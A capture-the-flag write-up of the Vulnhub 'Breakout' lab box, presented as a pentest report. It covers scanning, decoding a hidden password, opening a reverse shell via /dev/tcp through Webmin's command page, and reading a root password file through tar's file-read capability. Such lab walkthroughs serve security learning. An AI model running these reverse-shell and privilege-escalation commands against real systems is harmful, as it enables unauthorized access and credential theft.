# Vulnhub - 02 breakout

In this penetration test report, we detail the steps and commands used to assess and exploit a target machine with the IP address `192.168.1.24`. The goal of the test was to identify vulnerabilities, gain unauthorized access to the system, and escalate privileges. Below are the key actions taken during the penetration test.

## Initial Network Enumeration

### Discovering Local Machines

```bash
sudo netdiscover -r 192.168.1.0/24
```

- A network scan was performed to discover all machines on the local network (`192.168.1.0/24`).
- The target machine was identified at IP `192.168.1.24`.

## Initial Scanning

### Nmap Scan

```bash
nmap -sC -sV 192.168.1.24
```

- Nmap was used to perform a comprehensive scan of the target machine.
- The `-sC` flag enabled default scripts, and `-sV` was used for version enumeration.

 ![image](https://github.com/fullopsec/Pentests/assets/114147068/7d9cbce1-ec1d-4ec1-9e5d-172d0aca3d9b)


## Web Application Enumeration

- The web application running on the target machine was analyzed.
- The source code of the web page was carefully reviewed for any potential hints or vulnerabilities.
- A mysterious code snippet was identified and decoded using an online tool from dcode.fr.

 ![image](https://github.com/fullopsec/Pentests/assets/114147068/60f6fd8a-2b3e-4440-861c-1f41e5448346)

Decoded as : `.2uqPEfj3D<P'a-3`

## User Enumeration

### Enum4linux

```bash
enum4linux -a 192.168.1.24
```

- The `enum4linux` tool was used to gather information about the target machine.
- It revealed the presence of a user named "cyber"

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/77904364-c0f9-489f-823e-38e87039b265)

- user cyber and password `.2uqPEfj3D<P'a-3`  work on the web service on the port 20000

## Webmin Exploitation

- The Webmin application, version 1.830, was identified on the target machine.
- It was discovered that commands could be executed through the application interface (https://breakout.home:20000/shell/?xnavigation=1).

### Command Execution

- A reverse shell command was executed through the Webmin interface to gain access to the target machine.

`sh -i >& /dev/tcp/192.168.1.27/9001 0>&1`
  
- A shell was obtained, and the connection was upgraded to a more interactive one using Python.

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/5ab1d70f-c001-403e-b3a2-a245940efb8e)

#### Upgrading a dumb shell to a usable one (interactive shell)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Press CTRL + Z

```
stty raw -echo
fg
export TERM=xterm
```

## Privilege Escalation

### Searching for SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

- An attempt to find SUID binaries did not yield any results.

### Checking Capabilities

```bash
getcap -r / 2>/dev/null
```

- Capabilities were found on the `tar` utility, specifically `cap_dac_read_search=ep`.
- This capability allowed reading any files, including those owned by root.

Using linpeas, we found ./var/backups/.old_pass.bak

File is owned by root BUT we can read any file thanks to the tar utility.

![image](https://github.com/fullopsec/Pentests/assets/114147068/d72b89be-9ab1-4369-8f8d-577b7d846916)


### Reading Sensitive Files

- The `tar` utility was used to create a compressed archive

`./tar -cf password.tar /var/backups/.old_pass.bak`
  
- The archive was then extracted, and the sensitive file was read.

```
tar -xf password.tar
cd var/backups  
cat .old_pass.bak
```
  
- The contents of the file contained the root password.

# Conclusion

The penetration test involved decoding strings, user enumeration, Webmin exploit and and privilege escalation via unsecured tar utility.

